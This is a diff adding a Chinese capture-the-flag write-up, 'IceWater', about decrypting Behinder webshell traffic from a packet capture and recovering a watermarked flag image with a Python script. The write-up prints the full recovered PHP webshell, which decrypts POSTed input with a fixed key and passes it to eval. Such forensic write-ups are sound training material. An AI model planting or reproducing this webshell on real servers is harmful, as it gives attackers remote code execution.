@@ -749,6 +749,154 @@ def func2():
 
 ### 题目名称 IceWater
 
+打开流量包，发现是webshell流量，直接拿CTF-NetA梭一下
+
+根据默认密钥 `e45e329feb5d925b`，我们可以知道是冰蝎流量分析
+
+![](imgs/image-20250417210225286.png)
+
+流量包不多，我们手动解密分析了前面几个流量包后发现，一共有两个马，分别是`shell.php`和`she1l.php`
+
+![](imgs/image-20250419154429421.png)
+
+![](imgs/image-20250419154438433.png)
+
+然后解密HTTP流4的数据，可以得到第二个马的源码
+
+![](imgs/image-20250419154513307.png)
+
+![](imgs/image-20250419154537135.png)
+
+![](imgs/image-20250419154550735.png)
+
+![](imgs/image-20250419154618668.png)
+
+```python
+&lt;?php
+@error_reporting(0);
+session_start();
+    $key=&#34;5b4582c9d56b5b33&#34;;
+	$_SESSION[&#39;k&#39;]=$key;
+	$post=file_get_contents(&#34;php://input&#34;);
+	if(!extension_loaded(&#39;openssl&#39;))
+	{
+		$t=&#34;base64_&#34;.&#34;decode&#34;;
+		$post=$t($post.&#34;&#34;);
+		
+		for($i=0;$i&lt;strlen($post);$i&#43;&#43;) {
+    			 $post[$i] = $post[$i]^$key[$i&#43;1&amp;15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, &#34;AES128&#34;, $key);
+	}
+    $arr=explode(&#39;|&#39;,$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __invoke($p) {eval($p.&#34;&#34;);}}
+    @call_user_func(new C(),$params);
+?&gt;
+
+```
+
+然后发现第二个马的密钥不是默认密钥了，是 `5b4582c9d56b5b33`
+
+并且加密方式也换成了AES-CBC，IV为`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00` 
+
+
+![](imgs/image-20250419154902953.png)
+
+然后当我们分析到HTTP流7和流8的时候，发现攻击者创建了一张PNG图片
+
+![](imgs/image-20250419155450612.png)
+
+![](imgs/image-20250419155506249.png)
+
+这个流里有好多个请求和响应，我们继续分析后面的请求，发现攻击者一直在往这个PNG里加东西
+
+猜测是这个图片比较大，攻击者分了好几次写入
+
+![](imgs/image-20250419155644798.png)
+
+鉴于流量包中的请求比较多，因此我们把流7和流8的数据以文本的形式保存到本地，然后写个脚本匹配提取即可
+
+```python
+import re
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import base64
+
+key = &#34;5b4582c9d56b5b33&#34;
+key = key.encode(&#39;utf-8&#39;).ljust(16, b&#39;\x00&#39;)  # 默认填充到16字节(AES-128)
+iv = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
+
+def decrypt_aes_cbc(ciphertext_base64):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ciphertext = base64.b64decode(ciphertext_base64)
+    decrypted = cipher.decrypt(ciphertext)
+    return decrypted
+        
+def func1():
+    dec_data = []
+    with open(&#34;1.txt&#34;,&#39;r&#39;) as f:
+        data = f.read()
+    req_data = re.findall(r&#34;Cookie: PHPSESSID=m76qslkgb4tuu1ocg07i1rr1f0\n\n(.*?)\nHTTP/1&#34;,data)
+    # print(len(req_data))
+    for enc_data in req_data:
+        # print(enc_data)
+        dec_data.append(decrypt_aes_cbc(enc_data).decode())
+    # print(len(dec_data))
+    with open(&#34;2.txt&#34;,&#39;w&#39;) as f:
+        f.write(&#39;\n&#39;.join(dec_data))
+
+def func2():
+    dec_data = []
+    with open(&#34;2.txt&#34;,&#39;r&#39;) as f:
+        data = f.read()
+    base64_data = re.findall(r&#34;base64_decode\(&#39;(.*?)&#39;\)\);&#34;,data)
+    for item in base64_data:
+        # print(item[-100:])
+        dec_data.append(base64.b64decode(item))
+    # print(len(dec_data))
+    with open(&#34;3.txt&#34;,&#39;wb&#39;) as f:
+        f.write(b&#34;&#34;.join(dec_data))
+
+def func3():
+    with open(&#34;3.txt&#34;,&#39;r&#39;,errors=&#39;ignore&#39;) as f:
+        data = f.read()
+    base64_data = re.findall(r&#34;\$content=\&#34;(.*?)\&#34;&#34;,data)
+    # print(len(base64_data))
+    base64_png = &#34;&#34;.join(base64_data)
+    png_data = base64.b64decode(base64_png)
+    with open(&#34;flag.png&#34;,&#39;wb&#39;) as f:
+        f.write(png_data)
+
+if __name__ == &#34;__main__&#34;:
+    # func1()
+    # func2()
+    func3()
+```
+
+提取完整后可以得到下图
+
+![](imgs/image-20250419162534043.png)
+
+然后用工具提取一下盲水印即可得到最后的flag：`DASCTF{7da5cf04-f7ae-42cf-b98c-7a758a257a65}`
+
+当然，这里也可以多换几个工具来提取，找到提取最清晰的即可
+
+![](imgs/image-20250419162621758.png)
+
+![](imgs/image-20250419162925306.png)
+
+![](imgs/image-20250419162956540.png)
+
+![](imgs/image-20250419162847980.png)
+
+![](imgs/image-20250419162830766.png)
+
+
 ### 题目名称 并非乱ping
 
 题目附件给了一个加密的压缩包、一个wav以及一个`hide.py`
